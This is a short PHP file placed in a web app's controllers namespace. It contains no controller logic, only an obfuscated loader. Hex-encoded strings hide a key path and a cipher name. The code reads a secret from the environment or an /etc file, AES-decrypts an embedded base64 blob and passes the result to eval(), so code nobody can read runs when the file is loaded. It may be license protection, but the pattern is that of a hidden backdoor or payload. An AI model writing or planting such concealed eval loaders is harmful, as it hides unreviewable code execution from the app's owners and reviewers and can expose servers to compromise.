<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('JF+MvGNqCRtaDgRrkkIq5A==');

$c=base64_decode(

'gHxxWGdJP1f0hscI+zmfRa+qDtg3B94GitXZ9pXDhKzMNdquGTUHMPdGohwBB5taw3lzh4y8iipB' .
'J6jzPpUy9/aL7f8TXbwcND65FclH7GjgJMMsM/48wLnxVSCCdCE8HpIzhIG3meHswXy9QZy4N0b1' .
'IPUr+z1pODBQAoiaSR0rx3or6xWi6ByNI4E4n8Y/CWyHIxUf7w3d6yEentJ6JLlz+xDBf07UL60u' .
'Yz0PItNY0XlPU0RyVIPNhUQ+up/E'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

